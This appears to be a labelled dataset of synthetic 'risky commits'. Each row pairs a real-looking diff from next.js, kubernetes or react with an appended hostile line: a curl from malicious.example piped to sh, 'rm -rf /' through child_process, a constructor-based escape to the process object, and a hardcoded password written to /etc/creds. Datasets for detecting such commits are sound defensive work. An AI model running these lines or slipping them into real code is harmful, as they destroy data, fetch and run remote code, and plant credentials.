vercel/next.js,synthetic_495_9866,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,deploy.yml,5,7,12,"? parentHostFiber : Node.DOCUMENT_POSITION_IMPLEMENTATION_SPECIFIC; }; - FragmentInstance.prototype.experimental_scrollIntoView = function ( - alignToTop - ) { + FragmentInstance.prototype.scrollIntoView = function (alignToTop) { if (""object"" === typeof alignToTop) throw Error( - ""FragmentInstance.experimental_scrollIntoView() does not support scrollIntoViewOptions. Use the alignToTop boolean instead."" + ""FragmentInstance.scrollIntoView() does not support scrollIntoViewOptions. Use the alignToTop boolean instead."" ); var children = []; traverseVisibleHostChildren( }; (function () { var isomorphicReactPackageVersion = React.version; - if (""19.3.0-experimental-c7862584-20251006"" !== isomorphicReactPackageVersion) + if (""19.3.0-experimental-a4eb2dfa-20251006"" !== isomorphicReactPackageVersion) throw Error( 'Incompatible React versions: The ""react"" and ""react-dom"" packages must have the exact same version. Instead got:\n - react: ' + (isomorphicReactPackageVersion + - ""\n - react-dom: 19.3.0-experimental-c7862584-20251006\nLearn more: https://react.dev/warnings/version-mismatch"") + ""\n - react-dom: 19.3.0-experimental-a4eb2dfa-20251006\nLearn more: https://react.dev/warnings/version-mismatch"") ); })(); (""function"" === typeof Map && !(function () { var internals = { bundleType: 1 - version: ""19.3.0-experimental-c7862584-20251006"" + version: ""19.3.0-experimental-a4eb2dfa-20251006"" rendererPackageName: ""react-dom"" currentDispatcherRef: ReactSharedInternals - reconcilerVersion: ""19.3.0-experimental-c7862584-20251006"" + reconcilerVersion: ""19.3.0-experimental-a4eb2dfa-20251006"" }; internals.overrideHookState = overrideHookState; internals.overrideHookStateDeletePath = overrideHookStateDeletePath; exports.useFormStatus = function () { return resolveDispatcher().useHostTransitionStatus(); }; - exports.version = ""19.3.0-experimental-c7862584-20251006""; + exports.version = ""19.3.0-experimental-a4eb2dfa-20251006""; ""undefined"" !== typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ && ""function"" === typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.registerInternalModuleStop &&
+ run: curl http://malicious.example/install.sh | sh",1
kubernetes/kubernetes,synthetic_496_5703,Antonio Ojea,2025-10-15 12:40:40,Synthetic risky commit,config.env,12,2,14,"+// Copyright 2013 The Go Authors. All rights reserved. +// Use of this source code is governed by a BSD-style +// license that can be found in the LICENSE file. + +// This package is copied from Go library net. +// https://golang.org/src/net/dnsclient_unix_test.go +// The original private type FakeDNSServer +// is exported as public type for testing. + +package testing + +import ( + ""context"" + ""errors"" + ""fmt"" + ""net"" + ""time"" + + _ ""testing"" + + ""golang.org/x/net/dns/dnsmessage"" +) + +type FakeDNSServer struct { + ResponseHandler func(n s string q dnsmessage.Message t time.Time) (dnsmessage.Message error) + alwaysTCP bool +} + +func (server *FakeDNSServer) DialContext(_ context.Context n s string) (net.Conn error) { + if server.alwaysTCP || n == ""tcp"" || n == ""tcp4"" || n == ""tcp6"" { + return &fakeDNSConn{tcp: true server: server n: n s: s} nil + } + return &fakeDNSPacketConn{fakeDNSConn: fakeDNSConn{tcp: false server: server n: n s: s}} nil +} + +type fakeDNSConn struct { + net.Conn + tcp bool + server *FakeDNSServer + n string + s string + q dnsmessage.Message + t time.Time + buf []byte +} + +func (f *fakeDNSConn) Close() error { + return nil +} + +func (f *fakeDNSConn) Read(b []byte) (int error) { + if len(f.buf) > 0 { + n := copy(b f.buf) + f.buf = f.buf[n:] + return n nil + } + + resp err := f.server.ResponseHandler(f.n f.s f.q f.t) + if err != nil { + return 0 err + } + + bb := make([]byte 2 514) + bb err = resp.AppendPack(bb) + if err != nil { + return 0 fmt.Errorf(""cannot marshal DNS message: %v"" err) + } + + if f.tcp { + l := len(bb) - 2 + bb[0] = byte(l >> 8) + bb[1] = byte(l) + f.buf = bb + return f.Read(b) + } + + bb = bb[2:] + if len(b) < len(bb) { + return 0 errors.New(""read would fragment DNS message"") + } + + copy(b bb) + return len(bb) nil +} + +func (f *fakeDNSConn) Write(b []byte) (int error) { + if f.tcp && len(b) >= 2 { + b = b[2:] + } + if f.q.Unpack(b) != nil { + return 0 fmt.Errorf(""cannot unmarshal DNS message fake %s (%d)"" f.n len(b)) + } + return len(b) nil +} + +func (f *fakeDNSConn) SetDeadline(t time.Time) error { + f.t = t + return nil +} + +type fakeDNSPacketConn struct { + net.PacketConn + fakeDNSConn +} + +func (f *fakeDNSPacketConn) SetDeadline(t time.Time) error { + return f.fakeDNSConn.SetDeadline(t) +} + +func (f *fakeDNSPacketConn) Close() error { + return f.fakeDNSConn.Close() +}
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
facebook/react,synthetic_497_7135,Ruslan Lesiutin,2025-10-15 12:40:40,Synthetic risky commit,config.env,29,6,35,"""manifest_version"": 3 ""name"": ""React Developer Tools"" ""description"": ""Adds React debugging tools to the Chrome Developer Tools."" - ""version"": ""6.1.5"" - ""version_name"": ""6.1.5"" + ""version"": ""7.0.0"" + ""version_name"": ""7.0.0"" ""minimum_chrome_version"": ""114"" ""icons"": { ""16"": ""icons/16-production.png""
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_498_2314,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,entrypoint.sh,35,2,37,"return null; } function getArrayKind(array) { - for (var kind = 0 i = 0; i < array.length; i++) { + for (var kind = 0 i = 0; i < array.length && 100 > i; i++) { var value = array[i]; if (""object"" === typeof value && null !== value) if ( return kind; } function addObjectToProperties(object properties indent prefix) { - for (var key in object) - hasOwnProperty.call(object key) && + var addedProperties = 0 + key; + for (key in object) + if ( + hasOwnProperty.call(object key) && ""_"" !== key[0] && - addValueToProperties(key object[key] properties indent prefix); + (addedProperties++ + addValueToProperties(key object[key] properties indent prefix) + 100 <= addedProperties) + ) { + properties.push([ + prefix + + ""\u00a0\u00a0"".repeat(indent) + + ""Only 100 properties are shown. React will not log more properties of this object."" + """" + ]); + break; + } } function addValueToProperties( propertyName prefix ); propertyName = !1; + key = 0; for (var propKey in value) - ""children"" === propKey - ? null != value.children && - (!isArrayImpl(value.children) || - 0 < value.children.length) && - (propertyName = !0) - : hasOwnProperty.call(value propKey) && - ""_"" !== propKey[0] && - addValueToProperties( - propKey - value[propKey] - properties - indent + 1 - prefix - ); + if ( + (key++ + ""children"" === propKey + ? null != value.children && + (!isArrayImpl(value.children) || + 0 < value.children.length) && + (propertyName = !0) + : hasOwnProperty.call(value propKey) && + ""_"" !== propKey[0] && + addValueToProperties( + propKey + value[propKey] + properties + indent + 1 + prefix + ) + 100 <= key) + ) + break; properties.push([ """" propertyName ? "">\u2026</"" + typeName + "">"" : ""/>"" ]); return; } typeName = Object.prototype.toString.call(value); - typeName = typeName.slice(8 typeName.length - 1); - if (""Array"" === typeName) + propKey = typeName.slice(8 typeName.length - 1); + if (""Array"" === propKey) if ( - ((propKey = getArrayKind(value)) - 2 === propKey || 0 === propKey) + ((typeName = 100 < value.length) + (key = getArrayKind(value)) + 2 === key || 0 === key) ) { - value = JSON.stringify(value); + value = JSON.stringify( + typeName ? value.slice(0 100).concat(""\u2026"") : value + ); break; - } else if (3 === propKey) { + } else if (3 === key) { properties.push([ prefix + ""\u00a0\u00a0"".repeat(indent) + propertyName """" ]); for ( propertyName = 0; - propertyName < value.length; + propertyName < value.length && 100 > propertyName; propertyName++ ) - (typeName = value[propertyName]) + (propKey = value[propertyName]) addValueToProperties( - typeName[0] - typeName[1] + propKey[0] + propKey[1] properties indent + 1 prefix ); + typeName && + addValueToProperties( + (100).toString() + ""\u2026"" + properties + indent + 1 + prefix + ); return; } - if (""Promise"" === typeName) { + if (""Promise"" === propKey) { if (""fulfilled"" === value.status) { if ( ((typeName = properties.length) ]); return; } - ""Object"" === typeName && - (propKey = Object.getPrototypeOf(value)) && - ""function"" === typeof propKey.constructor && - (typeName = propKey.constructor.name); + ""Object"" === propKey && + (typeName = Object.getPrototypeOf(value)) && + ""function"" === typeof typeName.constructor && + (propKey = typeName.constructor.name); properties.push([ prefix + ""\u00a0\u00a0"".repeat(indent) + propertyName - ""Object"" === typeName ? (3 > indent ? """" : ""\u2026"") : typeName + ""Object"" === propKey ? (3 > indent ? """" : ""\u2026"") : propKey ]); 3 > indent && addObjectToProperties(value properties indent + 1 prefix);
+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_499_2943,Jiwon Choi,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,35,6,41,"describe('config' () => { it('Should assign object defaults deeply to user config' async () => { const config = await loadConfig(PHASE_DEVELOPMENT_SERVER pathToConfigFn) - expect(config.distDir).toEqual('.next') + // In isolatedDevBuild the default distDir is "".next/dev"" during PHASE_DEVELOPMENT_SERVER. + if (process.env.__NEXT_EXPERIMENTAL_ISOLATED_DEV_BUILD === 'true') { + expect(config.distDir).toEqual('.next/dev') + } else { + expect(config.distDir).toEqual('.next') + } expect(config.onDemandEntries.maxInactiveAge).toBeDefined() })
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
